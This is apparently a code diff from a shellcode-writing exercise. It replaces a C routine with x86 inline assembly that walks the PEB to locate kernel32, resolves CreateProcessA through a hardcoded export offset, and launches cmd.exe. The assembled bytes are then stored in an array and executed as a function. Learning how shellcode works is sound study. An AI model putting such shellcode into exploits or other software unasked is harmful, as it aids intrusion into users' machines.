@@ -1,4 +1,4 @@
-#include <iostream>
+/*#include <iostream>
 #include <Windows.h>
 #include <wchar.h>
 
@@ -112,22 +112,82 @@ typedef BOOL (*CREATE_PROCESS_A_PROC)(
   LPCSTR                lpCurrentDirectory,
   LPSTARTUPINFOA        lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation
-);
-
-int main()
+);*/
+void shellcode_asm(void)
 {
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-    for (int i = 0; i < sizeof(si); i++)
-    {
-        ((unsigned char *)(&si))[i] = 0;
+    __asm {
+        nop
+        nop
+		nop
+		nop
+        // HMODULE hModule = GetModuleHandleW(L"kernel32.dll");
+        mov    eax, fs:0x30              ; PEB
+        mov    eax, [eax+0x0c]         ; PEB->Ldr
+        mov    eax, [eax+0x14]         ; PEB->Ldr->InMemOrderModuleList
+        mov    eax, [eax]                ; pEntry = pEntry->Flink
+        mov    eax, [eax]                ; pEntry = pEntry->Flink
+        mov    eax, [eax+0x10]         ; kernel32.dll hModule (CodeBase)
+
+        // FARPROC proc = GetProcAddress(hModule, "CreateProcessA");
+        mov    ebx, [eax+0x3c]         ; pImageDosHeader->e_lfanew
+        mov    ebx, [ebx+eax+0x78]   ; pImageHeader->OptionalHeader.DataDirectory->VirtualAddress
+        mov    ebx, [ebx+eax+0x1c]   ; pImageExportDirectory->AddressOfFunctions
+        mov    ebx, [ebx+eax+0x0298] ; pAddressOfFunctions[CreateProcessA]
+        add    eax, ebx              ; CreateProcessA
+
+        // Memory allocation and initialization
+        push   ebp
+        mov    ebp, esp
+        and    esp, 0xfffffff8
+        xor    ebx, ebx
+        mov    ecx, 0x16
+clear:
+        push   ebx
+        dec    ecx
+        cmp    ecx, ebx
+        jne    clear
+
+        mov    [esp + 0x10], 0x44
+
+        push   esp
+        lea    ecx, [esp + 0x14]
+        push   ecx
+        mov    ecx, 0x07
+args:
+        push   ebx
+        dec    ecx
+        cmp    ecx, ebx
+        jne    args
+        jmp    cmd
+create_process:
+        call   eax
+        mov    esp, ebp
+        pop    ebp
+        ret                         ; 0xc3, remove and decrement the jmp offset
+cmd:
+        call   create_process
+        nop                         ; application name
+        nop
+		nop
+		nop
     }
-    si.cb = sizeof(si);
-    for (int i = 0; i < sizeof(pi); i++)
-    {
-        ((unsigned char *)(&pi))[i] = 0;
-    }
-    CREATE_PROCESS_A_PROC create_process_a = (CREATE_PROCESS_A_PROC)InternalGetProcAddress(InternalGetModuleHandleW(L"kernel32.dll"), "CreateProcessA");
-    create_process_a("C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+}
+const unsigned char buffer[] = {
+  0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c, 0x8b,
+  0x40, 0x14, 0x8b, 0x00, 0x8b, 0x00, 0x8b, 0x40, 0x10, 0x8b,
+  0x58, 0x3c, 0x8b, 0x5c, 0x03, 0x78, 0x8b, 0x5c, 0x03, 0x1c,
+  0x8b, 0x9c, 0x03, 0x98, 0x02, 0x00, 0x00, 0x03, 0xc3, 0x55,
+  0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x33, 0xdb, 0xb9, 0x16, 0x00,
+  0x00, 0x00, 0x53, 0x49, 0x3b, 0xcb, 0x75, 0xfa, 0xc6, 0x44,
+  0x24, 0x10, 0x44, 0x54, 0x8d, 0x4c, 0x24, 0x14, 0x51, 0xb9,
+  0x07, 0x00, 0x00, 0x00, 0x53, 0x49, 0x3b, 0xcb, 0x75, 0xfa,
+  0xeb, 0x06, 0xff, 0xd0, 0x8b, 0xe5, 0x5d, 0xc3, 0xe8, 0xf5,
+  0xff, 0xff, 0xff,
+  'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0x00
+};
+void (*shellcode)(void) = (void(*)(void))&buffer[0];
+int main(int argc, char **argv)
+{
+    shellcode();
     return 0;
 }
